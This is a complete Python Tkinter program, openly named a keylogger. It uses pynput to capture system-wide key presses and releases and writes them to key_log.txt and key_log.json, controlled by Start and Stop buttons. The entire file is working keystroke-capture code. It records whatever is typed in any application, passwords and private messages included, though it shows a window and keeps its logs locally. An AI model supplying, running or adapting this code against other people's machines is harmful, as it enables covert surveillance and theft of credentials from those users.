import tkinter as tk
from tkinter import *
import json
from pynput import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        
        self.keys_used = []
        self.listener = None

        self.label = Label(root, text='Click "Start" to begin keylogging.')
        self.label.config(anchor=CENTER)
        self.label.pack()

        self.start_button = Button(root, text="Start", command=self.start_keylogger)
        self.start_button.pack(side=LEFT)

        self.stop_button = Button(root, text="Stop", command=self.stop_keylogger, state='disabled')
        self.stop_button.pack(side=RIGHT)

        self.root.geometry("300x100")

    def generate_text_log(self, key):
        with open('key_log.txt', 'a') as keys_file:
            keys_file.write(key + '\n')

    def generate_json_file(self):
        with open('key_log.json', 'w') as key_log:
            json.dump(self.keys_used, key_log, indent=4)

    def on_press(self, key):
        self.keys_used.append({'Pressed': f'{key}'})

    def on_release(self, key):
        self.keys_used.append({'Released': f'{key}'})
        self.generate_text_log(str(key))
        self.generate_json_file()

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        self.label.config(text="Keylogger stopped.")
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')

if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    root.mainloop()
